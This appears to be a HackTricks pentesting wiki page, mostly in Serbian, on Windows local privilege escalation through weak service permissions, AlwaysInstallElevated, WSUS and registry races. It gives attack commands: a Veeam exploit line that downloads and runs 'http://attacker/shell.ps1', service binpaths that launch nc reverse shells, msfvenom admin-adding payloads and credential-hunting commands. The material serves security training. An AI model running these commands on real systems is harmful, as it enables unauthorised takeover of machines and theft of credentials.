# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Najbolji alat za pronalaženje Windows local privilege escalation vektora:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Početna Windows teorija

### Access Tokens

**Ako ne znate šta su Windows Access Tokens, pročitajte sledeću stranicu pre nastavka:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Pogledajte sledeću stranicu za više informacija o ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ako ne znate šta su integrity levels u Windows, trebalo bi da pročitate sledeću stranicu pre nastavka:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows bezbednosne kontrole

U Windows-u postoje različite stvari koje mogu **sprečiti da enumerišete sistem**, pokrenete izvršne fajlove ili čak **otkriju vaše aktivnosti**. Trebalo bi da **pročitate** sledeću **stranicu** i **izlistate** sve ove **mehanizme odbrane** pre nego što započnete privilege escalation enumeraciju:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess procesi pokrenuti preko `RAiLaunchAdminProcess` mogu se zloupotrebiti da bi se dostigao High IL bez promptova kada su AppInfo secure-path provere zaobiđene. Proverite posvećeni UIAccess/Admin Protection bypass workflow ovde:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation može biti zloupotrebljen za proizvoljno pisanje u SYSTEM registar (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## Sistemske informacije

### Enumeracija informacija o verziji

Proverite da li Windows verzija ima neku poznatu ranjivost (proverite i primenjene zakrpe).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Verzijski exploiti

Ovaj [site](https://msrc.microsoft.com/update-guide/vulnerability) je koristan za traženje detaljnih informacija o Microsoft bezbednosnim ranjivostima. Ova baza podataka sadrži više od 4.700 bezbednosnih ranjivosti, pokazujući **ogromnu napadnu površinu** koju predstavlja Windows okruženje.

**Na sistemu**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ima ugrađen watson)_

**Lokalno sa informacijama o sistemu**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repozitorijumi exploita:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Okruženje

Ima li bilo kakvih credential/Juicy informacija sačuvanih u env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell istorija
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell transkript fajlovi

Možete saznati kako da ovo uključite na [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Detalji izvršavanja PowerShell pipeline-a se beleže, obuhvatajući izvršene komande, pozive komandi i delove skripti. Međutim, potpuni detalji izvršavanja i rezultati izlaza možda neće biti zabeleženi.

Da biste ovo omogućili, sledite uputstva u odeljku "Transcript files" dokumentacije, i izaberite **"Module Logging"** umesto **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Da biste pregledali poslednjih 15 događaja iz PowersShell logova, možete izvršiti:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Beleži se kompletan zapis aktivnosti i pun sadržaj tokom izvršavanja skripte, obezbeđujući da je svaki blok koda dokumentovan dok se izvršava. Ovaj proces čuva sveobuhvatan revizijski trag svake aktivnosti, koristan za forenziku i analizu zlonamernog ponašanja. Dokumentovanjem svih aktivnosti u trenutku izvršavanja dobijaju se detaljni uvidi u proces.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Zapisivanje događaja za Script Block može se pronaći u Windows Event Viewer-u na putanji: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Da biste videli poslednjih 20 događaja, možete koristiti:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet podešavanja
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Pogoni
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Sistem možete kompromitovati ako se ažuriranja ne zahtevaju putem http**S**, već putem http.

Počinjete proverom da li mreža koristi non-SSL WSUS ažuriranje pokretanjem sledećeg u cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ili sledeće u PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Ako dobijete odgovor kao jedan od sledećih:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Tada je **podložno eksploataciji.** Ako je poslednja vrednost registra jednaka 0, unos WSUS-a će biti ignorisan.

Da biste iskoristili ove ranjivosti možete koristiti alate kao što su: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - To su MiTM weaponized exploit skripte za injektovanje 'fake' update-ova u non-SSL WSUS saobraćaj.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
U suštini, ovo je propust koji ovaj bug eksploatiše:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

Ovu ranjivost možete iskoristiti koristeći alat [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (kad bude dostupan).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Mnogi enterprise agenti izlažu localhost IPC interfejs i privilegovani kanal za ažuriranje. Ako se enrollment može preusmeriti na server napadača i updater veruje rogue root CA ili ima slabe provere potpisivača, lokalni korisnik može dostaviti maliciozni MSI koji SYSTEM servis instalira. Pogledajte generalizovanu tehniku (zasnovanu na Netskope stAgentSvc lancu – CVE-2025-0309) ovde:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` izlaže localhost servis na **TCP/9401** koji procesuira poruke kontrolisane od strane napadača, omogućavajući izvršenje proizvoljnih komandi kao **NT AUTHORITY\SYSTEM**.

- **Recon**: potvrdite listener i verziju, npr., `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: postavite PoC kao što je `VeeamHax.exe` sa potrebnim Veeam DLL-ovima u isti direktorijum, zatim pokrenite SYSTEM payload preko lokalnog soketa:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Servis izvršava komandu kao SYSTEM.
## KrbRelayUp

Postoji ranjivost za **local privilege escalation** u Windows **domain** okruženjima pod određenim uslovima. Ti uslovi obuhvataju okruženja u kojima je **LDAP signing is not enforced,** korisnici imaju prava koja im omogućavaju da konfigurišu **Resource-Based Constrained Delegation (RBCD),** kao i mogućnost da korisnici kreiraju računare unutar domena. Važno je napomenuti da su ovi **requirements** ispunjeni korišćenjem **default settings**.

Pronađite **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Za više informacija o toku napada pogledajte [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Ako** su ova 2 registra **omogućena** (vrednost je **0x1**), korisnici sa bilo kojim privilegijama mogu **instalirati** (izvršiti) `*.msi` fajlove kao NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Ako imate meterpreter sesiju, možete automatizovati ovu tehniku koristeći modul **`exploit/windows/local/always_install_elevated`**

### PowerUP

Koristite komandu `Write-UserAddMSI` iz power-up da kreirate u trenutnom direktorijumu Windows MSI binarni fajl za eskalaciju privilegija. Ovaj skript ispiše prekompajlovani MSI installer koji traži dodavanje korisnika/grupe (tako da će vam biti potreban GIU pristup):
```
Write-UserAddMSI
```
Samo pokrenite kreirani binarni fajl da biste eskalirali privilegije.

### MSI Wrapper

Pročitajte ovaj tutorial da biste naučili kako kreirati MSI wrapper koristeći ove alate. Imajte na umu da možete zapakovati fajl "**.bat**" ako **samo** želite da **izvršavate** **komandne linije**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generišite** pomoću Cobalt Strike ili Metasploit-a **novi Windows EXE TCP payload** u `C:\privesc\beacon.exe`
- Otvorite **Visual Studio**, izaberite **Create a new project** i ukucajte "installer" u polje za pretragu. Izaberite projekat **Setup Wizard** i kliknite **Next**.
- Dajte projektu ime, na primer **AlwaysPrivesc**, koristite **`C:\privesc`** za lokaciju, izaberite **place solution and project in the same directory**, i kliknite **Create**.
- Nastavite da klikćete **Next** dok ne dođete do koraka 3 od 4 (choose files to include). Kliknite **Add** i izaberite Beacon payload koji ste upravo generisali. Zatim kliknite **Finish**.
- Istaknite projekat **AlwaysPrivesc** u **Solution Explorer** i u **Properties**, promenite **TargetPlatform** sa **x86** na **x64**.
- Postoje i druga svojstva koja možete promeniti, kao što su **Author** i **Manufacturer** koja mogu učiniti instaliranu aplikaciju legitimnijom.
- Desni klik na projekat i izaberite **View > Custom Actions**.
- Desni klik na **Install** i izaberite **Add Custom Action**.
- Dvokliknite na **Application Folder**, izaberite vaš **beacon.exe** fajl i kliknite **OK**. Ovo će osigurati da se beacon payload izvrši čim se installer pokrene.
- U okviru **Custom Action Properties**, promenite **Run64Bit** na **True**.
- Na kraju, **sastavite ga**.
- Ako se prikaže upozorenje `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, uverite se da ste postavili platformu na x64.

### MSI Installation

Da izvršite **instalaciju** zlonamernog `.msi` fajla u **pozadini:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Za iskorišćavanje ove ranjivosti možete koristiti: _exploit/windows/local/always_install_elevated_

## Antivirus i detektori

### Podešavanja audita

Ova podešavanja odlučuju šta se **beleži**, zato obratite pažnju
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, zanimljivo je znati gde se šalju logs
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** je dizajniran za **upravljanje lokalnim Administrator lozinkama**, osiguravajući da je svaka lozinka **jedinstvena, nasumična i redovno ažurirana** na računarima pridruženim domenu. Ove lozinke se sigurno čuvaju u Active Directory i mogu im pristupiti samo korisnici kojima su dodeljena odgovarajuća ovlašćenja putem ACLs, što im omogućava da vide lokalne admin lozinke ako su ovlašćeni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ako je aktivno, **plain-text lozinke se čuvaju u LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Počevši od **Windows 8.1**, Microsoft je uveo poboljšanu zaštitu za Local Security Authority (LSA) kako bi **blokirao** pokušaje nepouzdanih procesa da **čitaju njegovu memoriju** ili ubrizgaju kod, dodatno osiguravajući sistem.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** je uveden u **Windows 10**. Njegova svrha je da zaštiti kredencijale pohranjene na uređaju od pretnji kao što su pass-the-hash napadi.| [**Više informacija o Credentials Guard ovde.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Keširani podaci za prijavu

**Domain credentials** se autentifikuju od strane **Local Security Authority** (LSA) i koriste ih komponente operativnog sistema. Kada se podaci za prijavu korisnika autentifikuju putem registrovanog bezbednosnog paketa, obično se uspostavljaju domain credentials za tog korisnika.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Korisnici & Grupe

### Enumeracija korisnika & grupa

Trebalo bi da proverite da li neka od grupa kojima pripadate ima zanimljive dozvole
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privilegovane grupe

Ako pripadate nekoj **privilegovanoj grupi, možda ćete moći da eskalirate privilegije**. Saznajte o privilegovanim grupama i kako ih zloupotrebiti za eskalaciju privilegija ovde:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulacija tokenima

**Saznajte više** o tome šta je **token** na ovoj stranici: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Pogledajte sledeću stranicu da biste **saznali o zanimljivim tokenima** i kako ih zloupotrebiti:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Ulogovani korisnici / sesije
```bash
qwinsta
klist sessions
```
### Kućni folderi
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Politika lozinki
```bash
net accounts
```
### Dohvati sadržaj međuspremnika
```bash
powershell -command "Get-Clipboard"
```
## Pokrenuti processes

### Dozvole fajlova i foldera

Pre svega, prilikom listanja processes **proverite da li se u command line procesa nalaze passwords**.\
Proverite da li možete **overwrite neki pokrenuti binary** ili da li imate write permissions nad binary folder kako biste exploit-ovali moguće [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Uvek proverite da li se pokreću [**electron/cef/chromium debuggers**, jer ih možete iskoristiti za eskalaciju privilegija](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Provera dozvola binarnih fajlova procesa**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Provera dozvola foldera binarnih fajlova procesa (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Možete napraviti memory dump pokrenutog procesa koristeći **procdump** iz sysinternals. Servisi poput FTP-a imaju **credentials in clear text in memory**, pokušajte napraviti memory dump i pročitati credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Nezaštićene GUI aplikacije

**Aplikacije koje se pokreću kao SYSTEM mogu omogućiti korisniku da pokrene CMD ili pregleda direktorijume.**

Primer: "Windows Help and Support" (Windows + F1), pretražite "command prompt", kliknite na "Click to open Command Prompt"

## Servisi

Service Triggers omogućavaju Windows-u da pokrene servis kada se dogode određeni uslovi (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, itd.). Čak i bez prava SERVICE_START često možete pokrenuti privilegovane servise aktiviranjem njihovih triggera. Pogledajte tehnike enumeracije i aktivacije ovde:

-
{{#ref}}
service-triggers.md
{{#endref}}

Dobijte spisak servisa:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Dozvole

Možete koristiti **sc** za dobijanje informacija o servisu
```bash
sc qc <service_name>
```
Preporučuje se da imate binary **accesschk** iz _Sysinternals_ kako biste proverili zahtevani nivo privilegija za svaku uslugu.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Preporučuje se proveriti da li "Authenticated Users" mogu izmeniti bilo koji servis:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Možete preuzeti accesschk.exe za XP ovde](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Omogući servis

Ako dobijate ovu grešku (na primer sa SSDPSRV):

_Sistemska greška 1058 se pojavila._\
_Servis ne može da se pokrene, ili zato što je onemogućen ili zato što nema omogućenih povezanih uređaja._

Možete ga omogućiti koristeći
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Imajte na umu da servis upnphost zavisi od SSDPSRV da bi radio (za XP SP1)**

**Još jedno zaobilazno rešenje** ovog problema je pokretanje:
```
sc.exe config usosvc start= auto
```
### **Izmena putanje binarnog fajla servisa**

U scenariju u kome grupa "Authenticated users" poseduje **SERVICE_ALL_ACCESS** nad servisom, moguće je promeniti izvršni binarni fajl servisa. Da biste izmenili i izvršili **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Ponovno pokretanje servisa
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privilegije se mogu eskalirati kroz različita dozvole:

- **SERVICE_CHANGE_CONFIG**: Omogućava rekonfiguraciju binarnog fajla servisa.
- **WRITE_DAC**: Omogućava rekonfiguraciju dozvola, što omogućava izmenu konfiguracije servisa.
- **WRITE_OWNER**: Dozvoljava sticanje vlasništva i rekonfiguraciju dozvola.
- **GENERIC_WRITE**: Nasleđuje mogućnost menjanja konfiguracije servisa.
- **GENERIC_ALL**: Takođe nasleđuje mogućnost menjanja konfiguracije servisa.

Za detekciju i eksploataciju ove ranjivosti može se koristiti _exploit/windows/local/service_permissions_.

### Slabe dozvole binarnih fajlova servisa

**Proverite da li možete izmeniti binarni fajl koji se izvršava od strane servisa** ili da li imate **write permissions on the folder** gde se binarni fajl nalazi ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Možete dobiti sve binarne fajlove koje servis izvršava pomoću **wmic** (not in system32) i proveriti vaše dozvole pomoću **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Takođe možete koristiti **sc** i **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Dozvole za izmenu registra servisa

Treba da proverite da li možete da izmenite bilo koji registar servisa.\
Možete **proveriti** svoje **dozvole** nad registrom servisa radeći:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Treba proveriti da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** poseduju `FullControl` dozvole. Ako je tako, binarni fajl koji servis izvršava može biti izmenjen.

Da promenite Path binarnog fajla koji se izvršava:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Some Windows Accessibility features create per-user **ATConfig** keys that are later copied by a **SYSTEM** process into an HKLM session key. A registry **symbolic link race** can redirect that privileged write into **any HKLM path**, giving an arbitrary HKLM **value write** primitive.

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lists installed accessibility features.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stores user-controlled configuration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` is created during logon/secure-desktop transitions and is writable by the user.

Abuse flow (CVE-2026-24291 / ATConfig):

1. Populate the **HKCU ATConfig** value you want to be written by SYSTEM.
2. Trigger the secure-desktop copy (e.g., **LockWorkstation**), which starts the AT broker flow.
3. **Win the race** by placing an **oplock** on `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; when the oplock fires, replace the **HKLM Session ATConfig** key with a **registry link** to a protected HKLM target.
4. SYSTEM writes the attacker-chosen value to the redirected HKLM path.

Once you have arbitrary HKLM value write, pivot to LPE by overwriting service configuration values:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Pick a service that a normal user can start (e.g., **`msiserver`**) and trigger it after the write. **Note:** the public exploit implementation **locks the workstation** as part of the race.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

Ako imate ovu dozvolu nad registrijem, to znači da **možete kreirati pod-registre iz ovog**. U slučaju Windows services, ovo je **dovoljno da se izvrši proizvoljni kod:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ako putanja do izvršnog fajla nije u navodnicima, Windows će pokušati da izvrši svaki deo putanje pre razmaka.

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Navedite sve putanje servisa bez navodnika, izuzev onih koje pripadaju ugrađenim Windows servisima:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Možete detektovati i iskoristiti** ovu ranjivost pomoću metasploit-a: `exploit/windows/local/trusted\_service\_path` Možete ručno kreirati service binary pomoću metasploit-a:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows omogućava korisnicima da navedu akcije koje će se preduzeti ako servis zakaže. Ova funkcija može biti konfigurisana da pokazuje na binarni fajl. Ako je taj binarni fajl zamenjiv, možda je moguća privilege escalation. Više detalja može se naći u [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

